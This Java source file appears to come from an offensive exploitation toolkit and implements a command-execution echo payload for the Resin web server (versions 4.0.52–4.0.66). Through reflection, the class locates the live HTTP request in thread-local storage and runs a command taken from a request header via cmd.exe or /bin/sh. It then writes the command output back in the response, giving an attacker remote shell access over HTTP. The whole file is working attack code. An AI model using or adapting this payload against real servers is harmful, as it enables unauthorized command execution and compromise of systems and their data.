package com.ppp.middleware.rceecho;

import com.ppp.annotation.JavaClassModifiable;
import com.ppp.annotation.JavaClassType;
import com.ppp.annotation.Middleware;

import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * @author Whoopsunix
 *
 * TargetObject = {com.caucho.env.thread2.ResinThread2}
 *   ---> threadLocals = {java.lang.ThreadLocal$ThreadLocalMap}
 *    ---> table = {class [Ljava.lang.ThreadLocal$ThreadLocalMap$Entry;}
 *     ---> [13] = {java.lang.ThreadLocal$ThreadLocalMap$Entry}
 *      ---> value = {com.caucho.server.http.HttpRequest}
 * idea_express: TargetObject.threadLocals.get("table").get("13").get("value")
 *
 * Version test
 *  [4.0.52, 4.0.66]
 */
@Middleware(Middleware.Resin)
@JavaClassType(JavaClassType.Default)
@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.PARAM})
public class ResinRE {
    private static String HEADER;
    private static String PARAM;

    public ResinRE() {
        try {
            Object threadLocals = getFieldValue(Thread.currentThread(), "threadLocals");
            Object[] table = (Object[]) getFieldValue(threadLocals, "table");

            for (int i = 0; i < table.length; i++) {
                Object entry = table[i];
                if (entry == null)
                    continue;
                Object value = getFieldValue(entry, "value");
                if (value == null)
                    continue;

                if (value.getClass().getName().equals("com.caucho.server.http.HttpRequest")) {
                    Object request = value;
                    Object response = invokeMethod(request, "getResponseFacade", new Class[]{}, new Object[]{});
                    Object header = invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});

                    if (header != null) {
                        String result = exec((String) header);
                        invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
                        Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
                        invokeMethod(writer, "write", new Class[]{char[].class, Integer.TYPE, Integer.TYPE}, new Object[]{result.toCharArray(), 0, result.toCharArray().length});
                        invokeMethod(writer, "close", new Class[]{}, new Object[]{});
                        invokeMethod(writer, "flush", new Class[]{}, new Object[]{});

                        return;
                    }


                }
            }

        } catch (Exception e) {
        }
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static String exec(String str) throws Exception {
        String[] cmd;
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            cmd = new String[]{"cmd.exe", "/c", str};
        } else {
            cmd = new String[]{"/bin/sh", "-c", str};
        }
        InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
        return exec_result(inputStream);
    }

    public static String exec_result(InputStream inputStream) throws Exception {
        byte[] bytes = new byte[1024];
        int len;
        StringBuilder stringBuilder = new StringBuilder();
        while ((len = inputStream.read(bytes)) != -1) {
            stringBuilder.append(new String(bytes, 0, len));
        }
        return stringBuilder.toString();
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        try {
            return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
        }catch (Exception e){
            return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
        }
    }

    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method = cls.getDeclaredMethod(methodName, argsClass);
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }

}
